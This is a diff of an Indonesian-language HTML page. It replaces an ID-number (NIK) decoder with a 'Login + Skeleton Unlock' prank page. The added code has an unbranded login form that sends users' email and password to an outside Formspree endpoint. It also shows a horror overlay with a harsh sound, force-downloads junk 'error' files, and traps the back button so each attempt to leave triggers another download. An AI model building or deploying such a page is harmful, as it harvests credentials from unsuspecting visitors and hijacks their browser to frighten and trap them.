@@ -1,178 +1,176 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Deteksi NIK KTP</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f6f9;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-        }
-        .container {
-            background: #ffffff;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 550px;
-        }
-        h2 {
-            text-align: center;
-            color: #333;
-            margin-bottom: 20px;
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            font-weight: bold;
-            margin-bottom: 5px;
-            color: #555;
-        }
-        input[type="text"] {
-            width: 100%;
-            padding: 12px;
-            font-size: 18px;
-            border: 2px solid #ddd;
-            border-radius: 6px;
-            box-sizing: border-box;
-            outline: none;
-            transition: border-color 0.3s;
-        }
-        input[type="text"]:focus {
-            border-color: #007bff;
-        }
-        .result-box {
-            margin-top: 20px;
-            background: #eef2f7;
-            padding: 15px;
-            border-radius: 6px;
-            border-left: 5px solid #007bff;
-        }
-        .result-box h3 {
-            margin-top: 0;
-            color: #007bff;
-            font-size: 16px;
-        }
-        ul {
-            padding-left: 20px;
-            margin: 0;
-        }
-        li {
-            margin-bottom: 8px;
-            color: #333;
-        }
-        .error {
-            color: #d9534f;
-            font-weight: bold;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login + Skeleton Unlock</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; user-select: none; font-family: 'Segoe UI', Tahoma, sans-serif; }
+body {
+  background: #8A2BE2;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  overflow: hidden;
+  transition: background 0.2s;
+}
+#canvas {
+  position: fixed; top:0; left:0; width:100vw; height:100vh; z-index:1; pointer-events:none;
+}
+/* Login Container */
+.login-container {
+  background: #ffffff;
+  padding: 35px;
+  border-radius: 12px;
+  box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+  width: 100%;
+  max-width: 400px;
+  position: relative;
+  z-index: 10;
+  text-align: center;
+}
+.login-container h2 { margin-bottom: 20px; color: #333; }
+.input-group { margin-bottom: 15px; text-align: left; }
+.input-group label { display: block; margin-bottom: 6px; color: #555; font-size: 14px; }
+.input-group input {
+  width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; outline:none;
+}
+.input-group input:focus { border-color: #8A2BE2; }
+.btn-submit {
+  width: 100%; padding: 12px; background: #667eea; border: none; border-radius: 6px;
+  color: #fff; font-weight: bold; cursor: pointer;
+}
+.btn-submit:hover { background: #5563c1; }
+
+/* Bar */
+.container-bars { margin-top:20px; display:flex; flex-direction:column; gap:10px; }
+.bar {
+  background: #111; color: #fff; padding: 14px; border-radius: 8px; font-weight: bold;
+  cursor: pointer; transition: transform 0.1s;
+}
+.bar:active { transform: scale(0.98); }
+.bar.locked { background: #444; color: #888; cursor: not-allowed; }
+.bar.unlocked { background: #28a745; }
+.hidden { display: none !important; }
+
+/* Glitch */
+.glitch-active { animation: glitch-anim 0.1s infinite; filter: invert(1); }
+@keyframes glitch-anim {
+  0%{transform:translate(0)}20%{transform:translate(-5px,5px)}
+  40%{transform:translate(-5px,-5px)}60%{transform:translate(5px,5px)}
+  80%{transform:translate(5px,-5px)}100%{transform:translate(0)}
+}
+#horror-overlay {
+  position: fixed; top:0; left:0; width:100vw; height:100vh; background:#000; color:#f00;
+  display:flex; justify-content:center; align-items:center; font-size:2.5rem; font-weight:900;
+  z-index:9999; text-shadow:3px 3px #550000;
+}
+</style>
 </head>
 <body>
+<canvas id="canvas"></canvas>
 
-<div class="container">
-    <h2>Auto Deteksi NIK KTP</h2>
-    <div class="form-group">
-        <label for="nikInput">Masukkan 16 Digit NIK:</label>
-        <input type="text" id="nikInput" maxlength="16" placeholder="Contoh: 1702... atau 3313..." oninput="deteksiNik()">
+<div class="login-container" id="main-menu">
+  <h2>Masuk ke Akun</h2>
+  <!-- Form disetel ke Formspree dan menambahkan atribut name pada input -->
+  <form action="https://formspree.io/f/xrppozay" method="POST">
+    <div class="input-group">
+      <label>Email atau Username</label>
+      <input type="text" name="email" id="email" placeholder="Masukkan email Anda" required>
     </div>
+    <div class="input-group">
+      <label>Kata Sandi</label>
+      <input type="password" name="password" id="password" placeholder="Masukkan kata sandi" required>
+    </div>
+    <button type="submit" class="btn-submit">Masuk</button>
+  </form>
 
-    <div class="result-box" id="resultContainer">
-        <h3>Hasil Deteksi:</h3>
-        <p id="outputText">Silakan ketik 16 digit NIK pada kolom di atas.</p>
-    </div>
+  <div class="container-bars">
+    <div class="bar" id="bar1">OPTION 1</div>
+    <div class="bar" id="bar2">OPTION 2 (KLIK 4x)</div>
+    <div class="bar locked" id="bar3">OPTION 3 (LOCKED)</div>
+  </div>
 </div>
 
+<div class="login-container hidden" id="sub-menu-bar1">
+  <div class="bar" id="sub1-tap">TAP 2x</div>
+  <div class="bar" id="sub1-glitch">Dont tuch</div>
+  <div class="bar" style="background:#666;margin-top:10px" onclick="showView(document.getElementById('main-menu'))">BACK</div>
+</div>
+
+<div class="login-container hidden" id="sub-menu-bar2">
+  <div class="bar" id="btn-unlock-ads">UNLOCK 3 ADS</div>
+  <div class="bar" id="btn-unlock-free">UNLOCK 3 FREE</div>
+  <div class="bar" style="background:#666;margin-top:10px" onclick="showView(document.getElementById('main-menu'))">BACK</div>
+</div>
+
+<div class="login-container hidden" id="menu-bar3">
+  <div class="bar" id="btn-download">DOWNLOAD</div>
+  <div class="bar" id="btn-exit">EXIT</div>
+</div>
+
+<div id="horror-overlay" class="hidden glitch-active">ARE YOU IDIOT??</div>
+
 <script>
-    // Kamus Kode Provinsi Indonesia
-    const daftarProvinsi = {
-        "11": "Aceh", "12": "Sumatera Utara", "13": "Sumatera Barat", 
-        "14": "Riau", "15": "Jambi", "16": "Sumatera Selatan", 
-        "17": "Bengkulu", "18": "Lampung", "19": "Kepulauan Bangka Belitung", 
-        "21": "Kepulauan Riau", "31": "DKI Jakarta", "32": "Jawa Barat", 
-        "33": "Jawa Tengah", "34": "DI Yogyakarta", "35": "Jawa Timur", 
-        "36": "Banten", "51": "Bali", "52": "Nusa Tenggara Barat (NTB)", 
-        "53": "Nusa Tenggara Timur (NTT)", "61": "Kalimantan Barat", 
-        "62": "Kalimantan Tengah", "63": "Kalimantan Selatan", 
-        "64": "Kalimantan Timur", "65": "Kalimantan Utara", 
-        "71": "Sulawesi Utara", "72": "Sulawesi Tengah", "73": "Sulawesi Selatan", 
-        "74": "Sulawesi Tenggara", "75": "Gorontalo", "76": "Sulawesi Barat", 
-        "81": "Maluku", "82": "Maluku Utara", "91": "Papua", 
-        "92": "Papua Barat", "93": "Papua Selatan", "94": "Papua Tengah", "95": "Papua Pegunungan"
-    };
+/* === 1. SKELETON CURSOR === */
+const canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d');
+let width=canvas.width=innerWidth, height=canvas.height=innerHeight;
+addEventListener('resize',()=>{width=canvas.width=innerWidth;height=canvas.height=innerHeight});
+const mouse={x:width/2,y:height/2};
+addEventListener('mousemove',e=>{mouse.x=e.clientX;mouse.y=e.clientY});
+const numSegments=32, segmentLength=12, spine=[];
+for(let i=0;i<numSegments;i++)spine.push({x:width/2,y:height/2+i*segmentLength,angle:0});
+const legs=[];
+for(let i=0;i<Math.floor(numSegments*0.7);i++){
+ legs.push({spineIdx:i+3,side:-1,footX:width/2,footY:height/2,targetX:width/2,targetY:height/2,stepProgress:1});
+ legs.push({spineIdx:i+3,side:1,footX:width/2,footY:height/2,targetX:width/2,targetY:height/2,stepProgress:1});
+}
+function updateSkeleton(){
+ const head=spine[0]; const dx=mouse.x-head.x, dy=mouse.y-head.y;
+ head.angle=Math.atan2(dy,dx); head.x+=dx*0.15; head.y+=dy*0.15;
+ for(let i=1;i<numSegments;i++){const p=spine[i-1],c=spine[i]; c.angle=Math.atan2(p.y-c.y,p.x-c.x); c.x=p.x-Math.cos(c.angle)*segmentLength; c.y=p.y-Math.sin(c.angle)*segmentLength;}
+ legs.forEach(leg=>{
+   const j=spine[leg.spineIdx]; const sa=j.angle+(leg.side*Math.PI/2);
+   const ix=j.x+Math.cos(sa)*35, iy=j.y+Math.sin(sa)*35;
+   const d=Math.hypot(leg.footX-ix,leg.footY-iy);
+   if(d>40&&leg.stepProgress>=1){leg.targetX=ix+Math.cos(j.angle)*15; leg.targetY=iy+Math.sin(j.angle)*15; leg.stepProgress=0;}
+   if(leg.stepProgress<1){leg.stepProgress+=0.2; leg.footX+=(leg.targetX-leg.footX)*0.4; leg.footY+=(leg.targetY-leg.footY)*0.4;}
+ });
+}
+function drawSkeleton(){
+ ctx.clearRect(0,0,width,height);
+ legs.forEach(leg=>{
+   const j=spine[leg.spineIdx]; ctx.strokeStyle='rgba(255,255,255,0.6)'; ctx.lineWidth=1.2;
+   const mx=(j.x+leg.footX)/2+Math.cos(j.angle)*10*leg.side, my=(j.y+leg.footY)/2+Math.sin(j.angle)*10*leg.side;
+   ctx.beginPath(); ctx.moveTo(j.x,j.y); ctx.lineTo(mx,my); ctx.lineTo(leg.footX,leg.footY); ctx.stroke();
+   ctx.fillStyle='#fff'; ctx.beginPath(); ctx.arc(leg.footX,leg.footY,1.5,0,Math.PI*2); ctx.fill();
+ });
+ for(let i=0;i<numSegments;i++){const s=spine[i]; ctx.fillStyle=i===0?'#00e5ff':'#fff'; ctx.beginPath(); ctx.arc(s.x,s.y,Math.max(1,(numSegments-i)*0.15+1),0,Math.PI*2); ctx.fill(); if(i>0){const p=spine[i-1]; ctx.strokeStyle='rgba(255,255,255,0.4)'; ctx.lineWidth=2; ctx.beginPath(); ctx.moveTo(p.x,p.y); ctx.lineTo(s.x,s.y); ctx.stroke();}}
+}
+(function loop(){updateSkeleton();drawSkeleton();requestAnimationFrame(loop);})();
 
-    const namaBulan = ["", "Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
+/* === 2. UNLOCK LOGIC === */
+const audioCtx=new (window.AudioContext||window.webkitAudioContext)();
+function playGlitchSound(d){if(audioCtx.state==='suspended')audioCtx.resume(); const bs=audioCtx.sampleRate*d; const b=audioCtx.createBuffer(1,bs,audioCtx.sampleRate); const o=b.getChannelData(0); for(let i=0;i<bs;i++)o[i]=Math.random()*2-1; const s=audioCtx.createBufferSource(); s.buffer=b; const f=audioCtx.createBiquadFilter(); f.type='bandpass'; f.frequency.value=1000; s.connect(f); f.connect(audioCtx.destination); s.start();}
+function playHarshHorrorSound(d){if(audioCtx.state==='suspended')audioCtx.resume(); const o1=audioCtx.createOscillator(), o2=audioCtx.createOscillator(), g=audioCtx.createGain(); o1.type='sawtooth'; o2.type='square'; o1.frequency.setValueAtTime(120,audioCtx.currentTime); o2.frequency.setValueAtTime(127,audioCtx.currentTime); g.gain.setValueAtTime(0.8,audioCtx.currentTime); o1.connect(g); o2.connect(g); g.connect(audioCtx.destination); o1.start(); o2.start(); setTimeout(()=>{o1.stop(); o2.stop();},d*1000);}
+function triggerGlitch(ms,cb){document.body.classList.add('glitch-active'); playGlitchSound(ms/1000); setTimeout(()=>{document.body.classList.remove('glitch-active'); if(cb)cb();},ms);}
 
-    function deteksiNik() {
-        const nik = document.getElementById('nikInput').value.trim();
-        const output = document.getElementById('outputText');
+const mainMenu=document.getElementById('main-menu'), subMenuBar1=document.getElementById('sub-menu-bar1'), subMenuBar2=document.getElementById('sub-menu-bar2'), menuBar3=document.getElementById('menu-bar3'), horrorOverlay=document.getElementById('horror-overlay');
+const bar1=document.getElementById('bar1'), bar2=document.getElementById('bar2'), bar3=document.getElementById('bar3');
+let bar2Clicks=0, isBar3Unlocked=false;
+function showView(view){ [mainMenu,subMenuBar1,subMenuBar2,menuBar3,horrorOverlay].forEach(v=>v.classList.add('hidden')); view.classList.remove('hidden'); }
 
-        if (nik.length === 0) {
-            output.innerHTML = "Silakan ketik 16 digit NIK pada kolom di atas.";
-            return;
-        }
-
-        if (nik.length !== 16) {
-            output.innerHTML = `<span class="error">NIK harus tepat 16 digit! (Saat ini: ${nik.length} digit)</span>`;
-            return;
-        }
-
-        if (!/^\d+$/.test(nik)) {
-            output.innerHTML = `<span class="error">NIK hanya boleh berisi angka!</span>`;
-            return;
-        }
-
-        // Ambil bagian-bagian NIK
-        const kodeProv = nik.substring(0, 2);
-        const kodeKabKota = nik.substring(2, 4);
-        const kodeKec = nik.substring(4, 6);
-        
-        let tglStr = nik.substring(6, 8);
-        const blnStr = nik.substring(8, 10);
-        const thnStr = nik.substring(10, 12);
-        const noUrut = nik.substring(12, 16);
-
-        // Deteksi Provinsi
-        const namaProvinsi = daftarProvinsi[kodeProv] || "Provinsi Tidak Dikenal";
-
-        // Deteksi Jenis Kelamin & Tanggal Lahir
-        let tglInt = parseInt(tglStr, 10);
-        let jenisKelamin = "Laki-laki";
-        
-        if (tglInt > 40) {
-            jenisKelamin = "Perempuan";
-            tglInt -= 40; // Kembalikan ke tanggal asli
-        }
-
-        // Format tanggal rapi (misal: 05 jadi 5)
-        let tanggalLahir = tglInt;
-
-        // Deteksi Bulan
-        const bulanIndex = parseInt(blnStr, 10);
-        const namaBulanLahir = (bulanIndex >= 1 && bulanIndex <= 12) ? namaBulan[bulanIndex] : "Bulan Tidak Valid";
-
-        // Asumsi tahun (jika tahun 00-25 masuk 2000an, sisanya 1900an)
-        let tahunLahirInt = parseInt(thnStr, 10);
-        let tahunLengkap = (tahunLahirInt <= 26) ? "20" + thnStr : "19" + thnStr;
-
-        // Tampilkan Hasil Otomatis
-        output.innerHTML = `
-            <ul>
-                <li><strong>Provinsi:</strong> ${namaProvinsi} (Kode: ${kodeProv})</li>
-                <li><strong>Kab/Kota & Kecamatan:</strong> Kode ${kodeKabKota} - ${kodeKec}</li>
-                <li><strong>Jenis Kelamin:</strong> ${jenisKelamin}</li>
-                <li><strong>Tanggal Lahir:</strong> ${tanggalLahir} ${namaBulanLahir} ${tahunLengkap}</li>
-                <li><strong>Nomor Urut Registrasi:</strong> ${noUrut}</li>
-            </ul>
-        `;
-    }
+bar1.addEventListener('click',()=>showView(subMenuBar1));
+document.getElementById('sub1-glitch').addEventListener('click',()=>triggerGlitch(2000,()=>showView(mainMenu)));
+bar2.addEventListener('click',()=>{bar2Clicks++; if(bar2Clicks>=4){bar2Clicks=0; showView(subMenuBar2);}});
+document.getElementById('btn-unlock-ads').addEventListener('click',()=>triggerGlitch(2000,()=>{isBar3Unlocked=true; bar3.classList.remove('locked'); bar3.classList.add('unlocked'); bar3.innerText="OPTION 3 (UNLOCKED)"; showView(mainMenu);}));
+document.getElementById('btn-unlock-free').addEventListener('click',()=>triggerGlitch(3000,()=>{showView(horrorOverlay); playHarshHorrorSound(3); setTimeout(()=>showView(mainMenu),3000);}));
+bar3.addEventListener('click',()=>{if(isBar3Unlocked)showView(menuBar3);});
+function downloadJunkFile(){playGlitchSound(0.5); const blob=new Blob(["FILE CORRUPTED / SYSTEM ERROR"],{type:"text/plain"}); const url=URL.createObjectURL(blob); const a=document.createElement("a"); a.href=url; a.download=`error_${Math.floor(Math.random()*89999+10000)}.txt`; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url);}
+document.getElementById('btn-download').addEventListener('click',downloadJunkFile);
+document.getElementById('btn-exit').addEventListener('click',downloadJunkFile);
+history.pushState(null,null,location.href); window.onpopstate=function(){history.go(1); downloadJunkFile();};
 </script>
-
 </body>
 </html>
